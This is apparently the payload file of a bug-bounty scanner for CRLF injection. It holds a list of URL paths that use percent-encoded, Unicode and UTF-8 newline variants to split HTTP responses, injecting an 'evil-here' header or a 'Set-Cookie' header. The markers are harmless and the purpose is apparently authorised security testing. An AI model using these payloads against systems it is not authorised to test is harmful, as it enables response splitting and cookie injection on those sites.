#from os import getenv
from lib.ColoredObject import Color

payloads = [
"/%0aevil-here:bugbountyplz",
"/%0d%0aevil-here:bugbountyplz",
"/%25%30aevil-here:bugbountyplz",
"/%250aevil-here:bugbountyplz",
"/%3f%0d%0aevil-here:bugbountyplz",
"/%3f%0aevil-here:bugbountyplz",
"/%u000aevil-here:bugbountyplz",
"/%26%0aevil-here:bugbountyplz",
"/%26%0d%0aSet-Cookie:bugbounty=bugbountyplz",
"/%23%0d%0aSet-Cookie:bugbounty=bugbountyplz",
"/%23%0aSet-Cookie:bugbounty=bugbountyplz",
"/%2F..%0d%0aSet-Cookie:bugbounty=bugbountyplz",
"/%u000a%u000dSet-Cookie:bugbounty=bugbountyplz",
"/%3B%0d%0aSet-Cookie:bugbounty=bugbountyplz",
"/%3B%0aSet-Cookie:bugbounty=bugbountyplz",
"/%E5%98%8A%E5%98%8DSet-Cookie:bugbounty=bugbountyplz",
]

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36'
}

to_try = []
ColorObj = Color()

#try:
#    Headers['X-Bug-Bounty'] = getenv('HACKERONE_ACCESS_TOKEN')
#except Exception:
#    pass

#"/%23%0aevil-here:bugbountyplz",
#"/%23%0devil-here:bugbountyplz",
#"/%2f%2e%2e%0d%0aevil-here:bugbountyplz",
#"/%3f%0d%0aSet-Cookie:bugbounty=bugbountyplz",
#"/%3f%0dSet-Cookie:bugbounty=bugbountyplz",
